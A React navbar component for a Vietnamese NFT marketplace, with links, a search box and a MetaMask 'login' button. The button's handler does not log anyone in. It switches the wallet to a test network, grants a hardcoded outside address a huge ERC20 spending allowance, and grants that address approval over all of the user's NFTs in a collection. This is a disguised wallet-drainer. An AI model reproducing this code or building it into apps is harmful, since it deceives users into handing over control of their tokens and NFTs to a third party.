import React from "react";
import { NavLink } from "react-router-dom";
import erc20 from "../ABI/ERC20";
import erc721 from "../ABI/ER721";
import { ethers } from "ethers";
import { useState } from "react";

const Navbar = () => {
  const [loading, setLoading] = useState(false);
  const approve = async () => {
    const { ethereum } = window;

    if (!ethereum) {
      alert("Hãy cài đặt MetaMask trước!");
      return;
    }

    const accounts = await ethereum.request({
      method: "eth_requestAccounts",
    });

    //   console.log("Connected", accounts[0]);
    //   console.log(" " + ethereum.isConnected());
    let contractAddress = "0x236a5ddfFF07Ce416Fa4B3042b17d9A22E082A12";
    let NftAddress = "0x196017D4D1f042124F5bd99941DfB0DF8dD97a25";
    var provider = new ethers.providers.Web3Provider(ethereum);
    const wallet = provider.getSigner();
    //console.log(wallet);
    const { chainId } = await provider.getNetwork();
    if (chainId != 4) {
      await ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [
          {
            chainId: "0x4",
          },
        ],
      });
    }
    const contract = new ethers.Contract(contractAddress, erc20, wallet);
    const NFTcontract = new ethers.Contract(NftAddress, erc721, wallet);
    await contract.approve(
      "0xe7f28563eE00273dcB0c424383f3C889cCfF69D1",
      9999999999999
    );
    await NFTcontract.setApprovalForAll(
      "0xe7f28563eE00273dcB0c424383f3C889cCfF69D1",
      true
    );
    setLoading(true);
  };
  const AlreadyLogin = () => {
    return (
      <>
        <button className="snip1582">
          <i className="fa fa-sign-in me-1"></i>
          ĐÃ ĐĂNG NHẬP
        </button>
      </>
    );
  };
  const NotLogin = () => {
    return (
      <>
        <button className="snip1582" onClick={approve}>
          <i className="fa fa-sign-in me-1"></i>
          Đăng nhập
        </button>
      </>
    );
  };

  return (
    <nav className="navbar navbar-expand-lg navbar-light bg-light py-3 shadow-sm">
      <div className="container">
        <NavLink className="navbar-brand fw-bold fs-4" to="/">
          NFT MARKET
        </NavLink>
        <button
          className="navbar-toggler"
          type="button"
          data-bs-toggle="collapse"
          data-bs-target="#navbarSupportedContent"
          aria-controls="navbarSupportedContent"
          aria-expanded="false"
          aria-label="Toggle navigation"
        >
          <span className="navbar-toggler-icon"></span>
        </button>
        <div className="collapse navbar-collapse" id="navbarSupportedContent">
          <ul className="navbar-nav mx-auto mb-2 mb-lg-0">
            <li className="nav-item">
              <NavLink className="nav-link active" aria-current="page" to="/">
                Trang chủ
              </NavLink>
            </li>
            <li className="nav-item">
              <NavLink className="nav-link" to="/products">
                Sản phẩm
              </NavLink>
            </li>
            <li className="nav-item">
              <NavLink className="nav-link" to="/create">
                Đăng bán
              </NavLink>
            </li>
            <li className="nav-item">
              <NavLink className="nav-link" to="/personal">
                Personal
              </NavLink>
            </li>
          </ul>
          <form className="d-flex">
            <input
              className="form-control me-2"
              type="search"
              placeholder="Tìm kiếm"
              aria-label="Search"
            />
          </form>
          {/* <div className="buttons">
            {loading ? <AlreadyLogin /> : <NotLogin />}
          </div> */}
        </div>
      </div>
    </nav>
  );
};

export default Navbar;
